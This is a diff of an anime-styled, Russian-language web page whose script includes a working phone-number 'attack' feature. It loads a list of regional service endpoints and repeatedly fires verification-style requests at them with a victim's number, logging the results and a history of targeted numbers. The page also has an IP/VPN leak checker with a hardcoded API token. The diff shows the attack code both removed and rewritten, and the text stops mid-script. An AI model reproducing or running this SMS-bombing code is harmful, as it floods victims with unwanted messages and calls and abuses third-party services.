@@ -11,17 +11,11 @@
   <link href="https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
 
   <style>
-    /* ══════ ОРИГИНАЛЬНЫЙ ДИЗАЙН GOD_AE86 (без изменений) ══════ */
+    /* ═══════════════ ОРИГИНАЛЬНЫЙ ДИЗАЙН GOD_AE86 ═══════════════ */
     :root {
-      --bg:       #1a1025;
-      --bg2:      #22133a;
-      --card:     rgba(34,18,58,0.88);
-      --text:     #f2deff;
-      --muted:    #c9a8e2;
-      --accent:   #ffb7c5;
-      --purple:   #c77dff;
-      --teal:     #a8edea;
-      --border:   rgba(199,125,255,0.22);
+      --bg:       #1a1025;  --bg2:      #22133a;  --card:     rgba(34,18,58,0.88);
+      --text:     #f2deff;  --muted:    #c9a8e2;  --accent:   #ffb7c5;
+      --purple:   #c77dff;  --teal:     #a8edea;  --border:   rgba(199,125,255,0.22);
       --shadow:   0 4px 40px rgba(255,183,197,0.16);
       --glow:     0 0 28px rgba(255,183,197,0.42);
       --pglow:    0 0 28px rgba(199,125,255,0.4);
@@ -32,23 +26,16 @@
     }
 
     [data-theme="light"] {
-      --bg:     #fce8f3;
-      --bg2:    #f9d8eb;
-      --card:   rgba(255,245,252,0.93);
-      --text:   #3a1a2e;
-      --muted:  #7a4a68;
-      --accent: #e05a82;
-      --purple: #9b59b6;
-      --border: rgba(224,90,130,0.22);
+      --bg:     #fce8f3;  --bg2:    #f9d8eb;  --card:   rgba(255,245,252,0.93);
+      --text:   #3a1a2e;  --muted:  #7a4a68;  --accent: #e05a82;
+      --purple: #9b59b6;  --border: rgba(224,90,130,0.22);
       --shadow: 0 4px 30px rgba(224,90,130,0.13);
       --glow:   0 0 24px rgba(224,90,130,0.38);
       --pglow:  0 0 24px rgba(155,89,182,0.35);
     }
 
     [data-anime="on"] {
-      --accent:  #ff4da6;
-      --purple:  #bf00ff;
-      --border:  rgba(191,0,255,0.32);
+      --accent:  #ff4da6;  --purple:  #bf00ff;  --border:  rgba(191,0,255,0.32);
       --shadow:  0 4px 50px rgba(255,77,166,0.3);
       --glow:    0 0 40px rgba(255,77,166,0.6);
       --pglow:   0 0 40px rgba(191,0,255,0.55);
@@ -562,6 +549,7 @@
     }
     .ip-check-table td:first-child {
       color: var(--muted);
+      width: 55%;
     }
     .ip-check-table td:last-child {
       font-weight: 600;
@@ -651,7 +639,6 @@
       .bio-name       { font-size:1.6rem; }
       .card           { padding:1.4rem; }
       .avatar         { width:125px; height:125px; }
-      .actions        { gap:.5rem; }
       .btn            { font-size:.76rem; padding:.66rem 1.1rem; }
       #gallery        { grid-template-columns:repeat(auto-fill,minmax(120px,1fr)); }
     }
@@ -825,498 +812,532 @@
 </div>
 
 <script>
-/* ═══════ ФОН: сакура / звёзды ═══════ */
-const vfxBg = document.getElementById('vfx-bg');
-const PETAL_N = 22, STAR_N = 38;
+// ========== ФОН, ТЕМА, ТАБЫ, ГАЛЕРЕЯ, АВАТАР, ЦИТАТЫ, НЕКО ==========
+(function() {
+  const vfxBg = document.getElementById('vfx-bg');
+  const PETAL_N = 22, STAR_N = 38;
 
-function mkPetals() {
-  vfxBg.innerHTML = '';
-  for (let i = 0; i < PETAL_N; i++) {
-    const el = document.createElement('div');
-    el.className = 'petal';
-    el.style.cssText = `
-      left:${Math.random()*100}vw;
-      width:${8+Math.random()*11}px;
-      height:${10+Math.random()*13}px;
-      animation-duration:${7+Math.random()*11}s;
-      animation-delay:${Math.random()*14}s;
-      opacity:${(.42+Math.random()*.45).toFixed(2)}
-    `.replace(/\s+/g,';');
-    vfxBg.appendChild(el);
+  function mkPetals() {
+    vfxBg.innerHTML = '';
+    for (let i = 0; i < PETAL_N; i++) {
+      const el = document.createElement('div');
+      el.className = 'petal';
+      el.style.cssText = `
+        left:${Math.random()*100}vw;
+        width:${8+Math.random()*11}px;
+        height:${10+Math.random()*13}px;
+        animation-duration:${7+Math.random()*11}s;
+        animation-delay:${Math.random()*14}s;
+        opacity:${(.42+Math.random()*.45).toFixed(2)}
+      `.replace(/\s+/g,';');
+      vfxBg.appendChild(el);
+    }
   }
-}
-function mkStars() {
-  vfxBg.innerHTML = '';
-  for (let i = 0; i < STAR_N; i++) {
-    const el = document.createElement('div');
-    el.className = 'star-vfx';
-    const s = `${2+Math.random()*5}px`;
-    el.style.cssText = `
-      left:${Math.random()*100}vw;
-      width:${s};height:${s};
-      animation-duration:${3+Math.random()*8}s;
-      animation-delay:${Math.random()*9}s
-    `.replace(/\s+/g,';');
-    vfxBg.appendChild(el);
+  function mkStars() {
+    vfxBg.innerHTML = '';
+    for (let i = 0; i < STAR_N; i++) {
+      const el = document.createElement('div');
+      el.className = 'star-vfx';
+      const s = `${2+Math.random()*5}px`;
+      el.style.cssText = `
+        left:${Math.random()*100}vw;
+        width:${s};height:${s};
+        animation-duration:${3+Math.random()*8}s;
+        animation-delay:${Math.random()*9}s
+      `.replace(/\s+/g,';');
+      vfxBg.appendChild(el);
+    }
   }
-}
-mkPetals();
+  mkPetals();
 
-/* ── Тема ── */
-const html = document.documentElement;
-const savedTheme = localStorage.getItem('theme') || 'dark';
-html.setAttribute('data-theme', savedTheme);
-document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
-document.getElementById('themeToggle').addEventListener('click', () => {
-  const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
-  html.setAttribute('data-theme', nxt);
-  localStorage.setItem('theme', nxt);
-  document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
-});
-
-/* ── Аниме-режим ── */
-let animeOn = false;
-document.getElementById('animeModeBtn').addEventListener('click', () => {
-  animeOn = !animeOn;
-  html.setAttribute('data-anime', animeOn ? 'on' : 'off');
-  document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
-  animeOn ? mkStars() : mkPetals();
-});
-
-/* ── Табы ── */
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    tab.classList.add('active');
-    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
-    if (tab.dataset.tab === 'bio') fetchQuote();
-    if (tab.dataset.tab === 'attack') renderHistory();
-    if (tab.dataset.tab === 'ip') runIpCheck();
+  // Тема
+  const html = document.documentElement;
+  const savedTheme = localStorage.getItem('theme') || 'dark';
+  html.setAttribute('data-theme', savedTheme);
+  document.getElementById('themeToggle').textContent = savedTheme === 'dark' ? '🌸' : '🌙';
+  document.getElementById('themeToggle').addEventListener('click', () => {
+    const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    html.setAttribute('data-theme', nxt);
+    localStorage.setItem('theme', nxt);
+    document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
   });
-});
 
-/* ── Заглушки для изображений ── */
-function setImageWithFallback(imgElement, src, fallbackSvg) {
-  imgElement.src = src || '';
-  imgElement.onerror = function() {
-    if (fallbackSvg) imgElement.src = 'data:image/svg+xml,' + encodeURIComponent(fallbackSvg);
-    imgElement.style.opacity = '1';
-  };
-  imgElement.onload = function() {
-    imgElement.style.opacity = '1';
-  };
-}
-
-const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
-const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
-
-/* ── Аватар ── */
-const avatarImg = document.getElementById('avatarImg');
-(async function fetchAvatar() {
-  const types = ['waifu','neko','shinobu','megumin'];
-  const t = types[Math.floor(Math.random() * types.length)];
-  let url = '';
-  try {
-    const r = await fetch(`https://api.waifu.pics/sfw/${t}`);
-    if (r.ok) {
-      const d = await r.json();
-      url = d.url;
-    }
-  } catch(e) {}
-  if (!url) {
-    try {
-      const r = await fetch('https://api.waifu.pics/sfw/waifu');
-      if (r.ok) {
-        const d = await r.json();
-        url = d.url;
-      }
-    } catch(e) {}
-  }
-  setImageWithFallback(avatarImg, url, AVATAR_FALLBACK);
-})();
-
-/* ── Галерея ── */
-const gallery = document.getElementById('gallery');
-async function loadGalleryImage(imgElement) {
-  const categories = ['waifu','neko','shinobu','megumin','awoo','cuddle','hug','pat','smile','wave'];
-  const cat = categories[Math.floor(Math.random() * categories.length)];
-  try {
-    const resp = await fetch(`https://api.waifu.pics/sfw/${cat}`);
-    if (resp.ok) {
-      const data = await resp.json();
-      if (data && data.url) {
-        setImageWithFallback(imgElement, data.url, WAIFU_FALLBACK);
-        return;
-      }
-    }
-  } catch(e) {}
-  imgElement.style.display = 'none';
-}
-(function buildGallery() {
-  gallery.innerHTML = '';
-  for (let i = 0; i < 4; i++) {
-    const img = document.createElement('img');
-    img.alt = `аниме ${i+1}`;
-    img.style.opacity = '0.4';
-    gallery.appendChild(img);
-    loadGalleryImage(img);
-  }
-})();
-
-/* ── Цитаты (работают офлайн) ── */
-const quotes = [
-  { q:'Если не веришь в себя, то и не стоит начинать.', c:'Макака', a:'Доктор Стоун' },
-  { q:'Настоящая сила — в умении защищать.',           c:'Аска',   a:'Евангелион' },
-  { q:'Неважно, сколько у тебя таланта. Главное — желание.', c:'Мидория', a:'Моя геройская академия' },
-  { q:'Даже в самой глубокой тьме можно найти свет.',  c:'Тандзиро', a:'Клинок, рассекающий демонов' },
-];
-function fetchQuote() {
-  const f = quotes[Math.floor(Math.random() * quotes.length)];
-  document.getElementById('quoteText').textContent = `"${f.q}"`;
-  document.getElementById('quoteSrc').textContent  = `— ${f.c} · ${f.a}`;
-}
-fetchQuote();
-document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
-
-/* ── Нeко ── */
-const nekoImg = document.getElementById('nekoImg');
-async function fetchNeko() {
-  nekoImg.style.opacity = '0.3';
-  let url = '';
-  try {
-    const r = await fetch('https://nekos.life/api/v2/img/meow');
-    if (r.ok) {
-      const d = await r.json();
-      url = d.url;
-    }
-  } catch(e) {}
-  if (!url) {
-    try {
-      const r = await fetch('https://api.waifu.pics/sfw/neko');
-      if (r.ok) {
-        const d = await r.json();
-        url = d.url;
-      }
-    } catch(e) {}
-  }
-  setImageWithFallback(nekoImg, url, WAIFU_FALLBACK);
-}
-document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
-fetchNeko();
-setInterval(fetchNeko, 30000);
-
-/* ═══════════ ATTACK LOGIC (без Storm) ═══════════ */
-let servicesDatabase = { ru: [], by: [], kz: [] };
-(async () => {
-  try {
-    const res = await fetch('services.json');
-    if (res.ok) servicesDatabase = await res.json();
-  } catch (e) {
-    console.warn('services.json не загружен, атака без внешних сервисов');
-  }
-})();
-
-function formatPhone(phone, type) {
-  const clean = phone.replace(/\D/g, '');
-  switch (type) {
-    case 'wp': return '+' + clean;
-    case 'nc': case 'np': case 'ds': case 'bf': case 'raw': return clean;
-    case 'cp': case 'ru': case 'sp': return '+' + clean;
-    default: return clean;
-  }
-}
-
-function applyPlaceholders(template, phone) {
-  return template.replace(/\{(\w+)\}/g, (match, key) => {
-    if (key === 'rand_ip') return '127.0.0.1';
-    if (key === 'rand_name') return 'Ivan';
-    if (key === 'rand_surname') return 'PivKo';
-    if (key === 'rand_email') return 'test@mail.ru';
-    return formatPhone(phone, key);
+  // Аниме-режим
+  let animeOn = false;
+  document.getElementById('animeModeBtn').addEventListener('click', () => {
+    animeOn = !animeOn;
+    html.setAttribute('data-anime', animeOn ? 'on' : 'off');
+    document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
+    animeOn ? mkStars() : mkPetals();
   });
-}
 
-async function sendServiceRequest(svc, phone, signal) {
-  const url = applyPlaceholders(svc.url, phone);
-  const method = svc.method || 'POST';
-  const headers = { ...(svc.headers || {}) };
-  let body = null;
-
-  if (svc.type === 'json' && svc.body) {
-    body = JSON.stringify(svc.body);
-    headers['Content-Type'] = 'application/json';
-  } else if (svc.type === 'form' && svc.body) {
-    const params = new URLSearchParams();
-    for (const [k, v] of Object.entries(svc.body)) {
-      params.append(k, applyPlaceholders(String(v), phone));
-    }
-    body = params.toString();
-    headers['Content-Type'] = 'application/x-www-form-urlencoded';
-  }
-
-  try {
-    await fetch(url, { method, headers, body, mode: 'no-cors', signal });
-    return true;
-  } catch (err) {
-    if (err.name === 'AbortError') throw err;
-    return false;
-  }
-}
-
-let attackRunning = false,
-    attackAbortController = null,
-    attackStats = { total: 0, success: 0, failed: 0 },
-    attackStartTime = null,
-    attackDuration = 0,
-    attackRegion = 'ru';
-
-async function startAttack() {
-  if (attackRunning) return;
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер телефона');
-  attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
-  attackRegion = document.querySelector('#regionChips .region-chip.active')?.dataset.r || 'ru';
-  const services = servicesDatabase[attackRegion] || [];
-
-  if (!services.length) return alert('Нет сервисов для региона ' + attackRegion);
-
-  attackRunning = true;
-  attackAbortController = new AbortController();
-  attackStats = { total: 0, success: 0, failed: 0 };
-  attackStartTime = Date.now();
-
-  document.getElementById('attackStartBtn').style.display = 'none';
-  document.getElementById('attackStopBtn').style.display = 'inline-block';
-  document.getElementById('atkRegionLabel').textContent = attackRegion.toUpperCase();
-  document.getElementById('atkTimeLeft').textContent = attackDuration;
-  document.getElementById('atkProgressFill').style.width = '0%';
-  document.getElementById('atkTotal').textContent = '0';
-  document.getElementById('atkSuccess').textContent = '0';
-  document.getElementById('atkFailed').textContent = '0';
-  document.getElementById('atkOverlay').classList.add('active');
-
-  try {
-    while (attackRunning && (Date.now() - attackStartTime) < attackDuration * 1000) {
-      for (const svc of services) {
-        if (!attackRunning) break;
-        attackStats.total++;
-        const ok = await sendServiceRequest(svc, phone, attackAbortController.signal);
-        if (ok) attackStats.success++;
-        else attackStats.failed++;
-        document.getElementById('atkTotal').textContent = attackStats.total;
-        document.getElementById('atkSuccess').textContent = attackStats.success;
-        document.getElementById('atkFailed').textContent = attackStats.failed;
-        await new Promise(r => setTimeout(r, 50));
-      }
-    }
-  } catch (e) {}
-
-  stopAttack();
-}
-
-function stopAttack() {
-  attackRunning = false;
-  if (attackAbortController) attackAbortController.abort();
-  attackAbortController = null;
-
-  document.getElementById('attackStartBtn').style.display = '';
-  document.getElementById('attackStopBtn').style.display = 'none';
-  document.getElementById('atkOverlay').classList.remove('active');
-
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (phone && attackStats.total > 0) {
-    const record = {
-      date: new Date().toLocaleString('ru'),
-      phone,
-      region: attackRegion,
-      duration: attackDuration,
-      total: attackStats.total,
-      success: attackStats.success,
-      failed: attackStats.failed
-    };
-    let hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-    hist.unshift(record);
-    if (hist.length > 30) hist = hist.slice(0, 30);
-    localStorage.setItem('attack_hist', JSON.stringify(hist));
-    renderHistory();
-  }
-}
-
-setInterval(() => {
-  if (!attackRunning) return;
-  const elapsed = (Date.now() - attackStartTime) / 1000;
-  const left = Math.max(0, attackDuration - Math.floor(elapsed));
-  document.getElementById('atkTimeLeft').textContent = left;
-  document.getElementById('atkProgressFill').style.width = Math.min(100, Math.round((elapsed / attackDuration) * 100)) + '%';
-}, 200);
-
-function renderHistory() {
-  const hist = JSON.parse(localStorage.getItem('attack_hist') || '[]');
-  const container = document.getElementById('historyEntries');
-  if (!hist.length) {
-    container.innerHTML = '<div style="color:var(--muted)">Нет завершённых атак</div>';
-    return;
-  }
-  container.innerHTML = hist.map(h => `
-    <div class="history-item">
-      <div class="h-top"><span class="h-phone">${h.phone}</span><span class="h-region">${h.region}</span></div>
-      <div class="h-stats">
-        <span class="ok">✓${h.success}</span>
-        <span class="fail">✗${h.failed}</span>
-        <span>${h.total ? Math.round(h.success*100/h.total) : 0}%</span>
-        <span>${h.duration}s</span>
-      </div>
-      <div style="font-size:.7rem; color:var(--text3); margin-top:.2rem;">${h.date}</div>
-    </div>
-  `).join('');
-}
-
-document.getElementById('attackStartBtn').addEventListener('click', startAttack);
-document.getElementById('attackStopBtn').addEventListener('click', stopAttack);
-document.getElementById('atkStopOverlayBtn').addEventListener('click', stopAttack);
-document.getElementById('clearHistoryBtn').addEventListener('click', () => {
-  localStorage.removeItem('attack_hist');
-  renderHistory();
-});
-
-// QR
-document.getElementById('qrBtn').addEventListener('click', () => {
-  const phone = document.getElementById('attackPhone').value.trim();
-  if (!phone) return alert('Введите номер');
-  window.open(`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=tel:${encodeURIComponent(phone)}`, '_blank');
-});
-
-// Экспорт / импорт
-document.getElementById('exportBtn').addEventListener('click', () => {
-  const config = { phone: document.getElementById('attackPhone').value, region: attackRegion, dur: document.getElementById('attackDur').value };
-  const blob = new Blob([JSON.stringify(config)], {type:'application/json'});
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'attack_config.json';
-  a.click();
-  URL.revokeObjectURL(a.href);
-});
-
-document.getElementById('importBtn').addEventListener('click', () => {
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.accept = '.json';
-  input.onchange = e => {
-    const file = e.target.files[0];
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = () => {
-      try {
-        const cfg = JSON.parse(reader.result);
-        if (cfg.phone) document.getElementById('attackPhone').value = cfg.phone;
-        if (cfg.dur) document.getElementById('attackDur').value = cfg.dur;
-        if (cfg.region) {
-          document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-          const target = document.querySelector(`#regionChips .region-chip[data-r="${cfg.region}"]`);
-          if (target) target.classList.add('active');
-        }
-      } catch(e) { alert('Ошибка импорта'); }
-    };
-    reader.readAsText(file);
-  };
-  input.click();
-});
-
-// Чипсы региона
-document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
-  chip.addEventListener('click', () => {
-    document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
-    chip.classList.add('active');
-  });
-});
-
-renderHistory();
-
-/* ═══════════ IP CHECK ═══════════ */
-const IP_TOKEN = '0zf1rwtib5ttwi0d';
-const API_BASE = 'https://api.2ip.io';
-
-function checkWebRTC() {
-  if (!window.RTCPeerConnection) return Promise.resolve(null);
-  return new Promise((resolve) => {
-    try {
-      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      pc.createDataChannel('');
-      pc.createOffer().then(offer => pc.setLocalDescription(offer));
-      pc.onicecandidate = (e) => {
-        if (e.candidate) {
-          const parts = e.candidate.candidate.split(' ');
-          const ip = parts[4];
-          if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-            resolve(ip);
-            pc.close();
-          }
-        } else {
-          resolve(null);
-          pc.close();
-        }
-      };
-      setTimeout(() => { resolve(null); pc.close(); }, 3000);
-    } catch (e) {
-      resolve(null);
-    }
-  });
-}
-
-async function runIpCheck() {
-  const tbody = document.getElementById('ipTableBody');
-  if (!tbody) return;
-  tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
-
-  try {
-    const [check, geo, dns] = await Promise.all([
-      fetch(`${API_BASE}/check?token=${IP_TOKEN}`).then(r => r.json()).catch(() => null),
-      fetch(`${API_BASE}/geo/ip?token=${IP_TOKEN}`).then(r => r.json()).catch(() => null),
-      fetch(`${API_BASE}/dns?token=${IP_TOKEN}`).then(r => r.json()).catch(() => null)
-    ]);
-
-    const results = [];
-
-    results.push({ method: 'Заголовки HTTP proxy', result: check?.is_proxy ? 'да' : 'нет', cls: check?.is_proxy ? 'bad' : 'ok' });
-    results.push({ method: 'Открытые порты HTTP proxy', result: check?.open_ports?.http_proxy ? 'да' : 'нет', cls: check?.open_ports?.http_proxy ? 'bad' : 'ok' });
-    results.push({ method: 'Открытые порты web proxy', result: check?.open_ports?.web_proxy_80 ? '80' : 'нет', cls: check?.open_ports?.web_proxy_80 ? 'warn' : 'ok' });
-    results.push({ method: 'Открытые порты VPN', result: check?.is_vpn ? 'да' : 'нет', cls: check?.is_vpn ? 'bad' : 'ok' });
-    results.push({ method: 'Подозрительное название хоста', result: check?.hostname || 'нет', cls: check?.hostname ? 'warn' : 'ok' });
-
-    const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const ipTZ = geo?.timezone || 'неизвестно';
-    const nowBrowser = new Date().toLocaleString('ru', { timeZone: browserTZ });
-    const nowIp = ipTZ !== 'неизвестно' ? new Date().toLocaleString('ru', { timeZone: ipTZ }) : '—';
-    const tzDiff = (ipTZ !== browserTZ) ? `IP: ${nowIp} (${ipTZ})<br>браузер: ${nowBrowser}` : 'совпадают';
-    results.push({ method: 'Разница во временных зонах', result: tzDiff, cls: ipTZ !== browserTZ ? 'warn' : 'ok' });
-
-    results.push({ method: 'Принадлежность IP к сети Tor', result: check?.is_tor ? 'да' : 'нет', cls: check?.is_tor ? 'bad' : 'ok' });
-    results.push({ method: 'Режим браузера Turbo', result: (navigator.connection?.type === 'cellular') ? 'да' : 'нет', cls: (navigator.connection?.type === 'cellular') ? 'warn' : 'ok' });
-    results.push({ method: 'Принадлежность IP хостинг провайдеру', result: check?.is_hosting ? 'да' : 'нет', cls: check?.is_hosting ? 'bad' : 'ok' });
-    results.push({ method: 'Определение web proxy (JS метод)', result: 'нет', cls: 'ok' });
-    results.push({ method: 'Определение туннеля (двусторонний пинг)', result: check?.is_anonymous ? 'высокая анонимизация' : 'нет', cls: check?.is_anonymous ? 'bad' : 'ok' });
-
-    const dnsServers = dns?.servers?.join(', ') || 'не определено';
-    results.push({ method: 'Утечка DNS', result: dnsServers, cls: dnsServers.includes('Cloudflare') ? 'warn' : 'ok' });
-    results.push({ method: 'VPN fingerprint', result: check?.vpn_fingerprint ? 'обнаружен' : 'нет', cls: check?.vpn_fingerprint ? 'bad' : 'ok' });
-
-    const webrtcLeak = await checkWebRTC();
-    results.push({ method: 'Утечка IP через WebRTC', result: webrtcLeak ? 'да (' + webrtcLeak + ')' : 'нет', cls: webrtcLeak ? 'bad' : 'ok' });
-
-    tbody.innerHTML = '';
-    results.forEach(r => {
-      const row = document.createElement('tr');
-      row.innerHTML = `<td>${r.method}</td><td class="${r.cls}">${r.result}</td>`;
-      tbody.appendChild(row);
+  // Табы
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+      if (tab.dataset.tab === 'bio') fetchQuote();
+      if (tab.dataset.tab === 'attack') renderHistory();
+      if (tab.dataset.tab === 'ip') runIpCheck();
     });
-  } catch (err) {
-    tbody.innerHTML = `<tr><td colspan="2" class="bad">Ошибка: ${err.message}</td></tr>`;
-  }
-}
+  });
 
-document.getElementById('refreshIpBtn').addEventListener('click', runIpCheck);
-if (document.getElementById('tab-ip').classList.contains('active')) runIpCheck();
+  // Заглушки для изображений
+  function setImageWithFallback(imgElement, src, fallbackSvg) {
+    imgElement.src = src || '';
+    imgElement.onerror = function() {
+      if (fallbackSvg) imgElement.src = 'data:image/svg+xml,' + encodeURIComponent(fallbackSvg);
+      imgElement.style.opacity = '1';
+    };
+    imgElement.onload = function() {
+      imgElement.style.opacity = '1';
+    };
+  }
+
+  const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
+  const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
+
+  // Аватар
+  const avatarImg = document.getElementById('avatarImg');
+  (async function fetchAvatar() {
+    const types = ['waifu','neko','shinobu','megumin'];
+    const t = types[Math.floor(Math.random() * types.length)];
+    let url = '';
+    try {
+      const r = await fetch(`https://api.waifu.pics/sfw/${t}`);
+      if (r.ok) { const d = await r.json(); url = d.url; }
+    } catch(e) {}
+    if (!url) {
+      try {
+        const r = await fetch('https://api.waifu.pics/sfw/waifu');
+        if (r.ok) { const d = await r.json(); url = d.url; }
+      } catch(e) {}
+    }
+    setImageWithFallback(avatarImg, url, AVATAR_FALLBACK);
+  })();
+
+  // Галерея
+  const gallery = document.getElementById('gallery');
+  async function loadGalleryImage(imgElement) {
+    const categories = ['waifu','neko','shinobu','megumin','awoo','cuddle','hug','pat','smile','wave'];
+    const cat = categories[Math.floor(Math.random() * categories.length)];
+    try {
+      const resp = await fetch(`https://api.waifu.pics/sfw/${cat}`);
+      if (resp.ok) {
+        const data = await resp.json();
+        if (data && data.url) {
+          setImageWithFallback(imgElement, data.url, WAIFU_FALLBACK);
+          return;
+        }
+      }
+    } catch(e) {}
+    imgElement.style.display = 'none';
+  }
+  (function buildGallery() {
+    gallery.innerHTML = '';
+    for (let i = 0; i < 4; i++) {
+      const img = document.createElement('img');
+      img.alt = `аниме ${i+1}`;
+      img.style.opacity = '0.4';
+      gallery.appendChild(img);
+      loadGalleryImage(img);
+    }
+  })();
+
+  // Цитаты
+  const quotes = [
+    { q:'Если не веришь в себя, то и не стоит начинать.', c:'Макака', a:'Доктор Стоун' },
+    { q:'Настоящая сила — в умении защищать.',           c:'Аска',   a:'Евангелион' },
+    { q:'Неважно, сколько у тебя таланта. Главное — желание.', c:'Мидория', a:'Моя геройская академия' },
+    { q:'Даже в самой глубокой тьме можно найти свет.',  c:'Тандзиро', a:'Клинок, рассекающий демонов' },
+  ];
+  function fetchQuote() {
+    const f = quotes[Math.floor(Math.random() * quotes.length)];
+    document.getElementById('quoteText').textContent = `"${f.q}"`;
+    document.getElementById('quoteSrc').textContent  = `— ${f.c} · ${f.a}`;
+  }
+  fetchQuote();
+  document.getElementById('newQuoteBtn').addEventListener('click', fetchQuote);
+
+  // Нeко
+  const nekoImg = document.getElementById('nekoImg');
+  async function fetchNeko() {
+    nekoImg.style.opacity = '0.3';
+    let url = '';
+    try {
+      const r = await fetch('https://nekos.life/api/v2/img/meow');
+      if (r.ok) { const d = await r.json(); url = d.url; }
+    } catch(e) {}
+    if (!url) {
+      try {
+        const r = await fetch('https://api.waifu.pics/sfw/neko');
+        if (r.ok) { const d = await r.json(); url = d.url; }
+      } catch(e) {}
+    }
+    setImageWithFallback(nekoImg, url, WAIFU_FALLBACK);
+  }
+  document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
+  fetchNeko();
+  setInterval(fetchNeko, 30000);
+
+  // ========== ЗАГРУЗКА services.json ==========
+  let servicesDB = { ru: [], by: [], kz: [] };
+  (async function loadServices() {
+    try {
+      const resp = await fetch('services.json');
+      if (resp.ok) {
+        const data = await resp.json();
+        if (data && typeof data === 'object') {
+          ['ru','by','kz'].forEach(region => {
+            if (Array.isArray(data[region])) servicesDB[region] = data[region];
+          });
+        }
+      }
+    } catch(e) {
+      console.warn('services.json не загружен, атака без внешних сервисов');
+    }
+  })();
+
+  // ========== ATTACK LOGIC ==========
+  function formatPhone(phone, type) {
+    const clean = phone.replace(/\D/g, '');
+    switch(type) {
+      case 'wp': case 'cp': case 'ru': case 'sp': return '+' + clean;
+      default: return clean;
+    }
+  }
+
+  function applyPlaceholders(template, phone) {
+    return template.replace(/\{(\w+)\}/g, (_, key) => {
+      if (key === 'rand_name') return 'Иван';
+      if (key === 'rand_surname') return 'Петров';
+      if (key === 'rand_email') return 'user@mail.ru';
+      if (key === 'rand_hex32') return 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
+      if (key === 'rand_days') return '5';
+      if (key === 'rand_int100_999') return '500';
+      if (key === 'rand_hex26') return 'abcdefabcdefabcdefabcdef';
+      return formatPhone(phone, key);
+    });
+  }
+
+  async function sendServiceRequest(service, phone, signal) {
+    let url = service.url;
+    const method = service.method || 'POST';
+    const headers = {};
+    let body = null;
+
+    // GET params
+    if (service.params && Object.keys(service.params).length > 0) {
+      const urlObj = new URL(url);
+      Object.entries(service.params).forEach(([k, v]) => {
+        urlObj.searchParams.set(k, applyPlaceholders(String(v), phone));
+      });
+      url = urlObj.toString();
+    } else {
+      url = applyPlaceholders(url, phone);
+    }
+
+    // Headers
+    if (service.headers) {
+      Object.entries(service.headers).forEach(([k, v]) => {
+        headers[k] = applyPlaceholders(String(v), phone);
+      });
+    }
+
+    // Body
+    if (service.type === 'json') {
+      body = JSON.stringify(service.body);
+      headers['Content-Type'] = 'application/json';
+      body = applyPlaceholders(body, phone);
+    } else if (service.type === 'form' && service.body) {
+      const params = new URLSearchParams();
+      Object.entries(service.body).forEach(([k, v]) => {
+        params.append(k, applyPlaceholders(String(v), phone));
+      });
+      body = params.toString();
+      headers['Content-Type'] = 'application/x-www-form-urlencoded';
+    }
+
+    try {
+      await fetch(url, { method, headers, body, mode: 'no-cors', signal });
+      return true;
+    } catch (err) {
+      if (err.name === 'AbortError') throw err;
+      return false;
+    }
+  }
+
+  let attackRunning = false;
+  let attackAbortController = null;
+  let attackStats = { total: 0, success: 0, failed: 0 };
+  let attackStartTime = null;
+  let attackDuration = 0;
+  let attackRegion = 'ru';
+
